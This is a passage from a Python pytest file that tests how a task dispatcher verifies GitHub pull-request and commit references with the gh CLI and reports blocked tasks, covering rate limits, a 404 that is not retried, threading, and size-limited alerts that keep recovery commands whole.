    writes, spawn, monkeypatch
):
    _fake_gh(monkeypatch, returncode=1, stderr="API rate limit exceeded (HTTP 403)")
    spawn.result = _SpawnResult(stdout=f"{_PR_HEADER}\n")
    _dispatch("ent_chk_2", _cicada_task())
    reason = _with_status(writes, "blocked")[-1]["reason"]
    assert f"Check it: gh pr view 999 --repo {_REPO}" in reason


def test_the_resolver_runs_off_the_event_loop_thread(writes, spawn, monkeypatch):
    """A blocking `gh` (30s, twice) must not stall the SSE loop."""
    seen: dict[str, int] = {}

    async def _spawn(*a, **k):
        seen["loop"] = threading.get_ident()
        return spawn.result

    def resolver(*a, **k):
        seen["resolver"] = threading.get_ident()
        return "exists"

    monkeypatch.setattr(apis, "_spawn_harness_skill", _spawn)
    monkeypatch.setattr(apis, "resolve_artifact_ref", resolver)
    spawn.result = _SpawnResult(stdout=f"{_PR_HEADER}\n")
    _dispatch("ent_thread_1", _cicada_task())
    assert seen["resolver"] != seen["loop"], "the resolver ran on the event loop thread"
    assert [w for w in writes if w.get("fn") == "complete_task_with_result"]


def test_a_404_is_not_retried_in_call(writes, spawn, monkeypatch):
    calls = _fake_gh(monkeypatch, returncode=1, stderr="gh: Not Found (HTTP 404)")
    spawn.result = _SpawnResult(stdout=f"[cicada] pull_request_link: {'ab' * 20}\n")
    _dispatch("ent_404_once", _cicada_task())
    assert len(calls) == 1, "a 404 cannot change on a second ask"
    assert "ref_check_unavailable" in _with_status(writes, "blocked")[-1]["reason"]


def test_abbreviated_sha_with_a_known_repo_gets_a_real_gh_api_check(writes, spawn):
    spawn.result = _SpawnResult(stdout="[cicada] pull_request_link: a1b2c3d\n")
    _dispatch("ent_sha_chk", _cicada_task())
    reason = _with_status(writes, "blocked")[-1]["reason"]
    assert f"Check it: gh api repos/{_REPO}/commits/a1b2c3d --jq .sha" in reason


def test_alert_never_carries_a_partial_recovery_command(writes, spawn, monkeypatch):
    """The alert is size-limited; a command block is kept whole or dropped whole."""
    monkeypatch.setattr(apis, "_ALERT_LIMIT", 900)
    spawn.result = _SpawnResult(
        stdout="[cicada] pull_request_link: https://github.com/some-org/some-repo/pull/7\n"
    )
    snapshot = _cicada_task()
    snapshot.pop("repo")
    notifier = _Notifier()
    _dispatch("ent_alertfit", snapshot, notifier=notifier)
    message = notifier.sent[-1]
    lines = [l for l in message.splitlines() if l.startswith("  neotoma ")]
    reason = _with_status(writes, "blocked")[-1]["reason"]
    assert len(reason) > 900, "fixture too small to exercise the limit"
    if lines:
        assert lines == [l for l in reason.splitlines() if l.startswith("  neotoma ")], (
            "a command was cut or altered"
        )
    else:
        assert "recovery commands omitted" in message
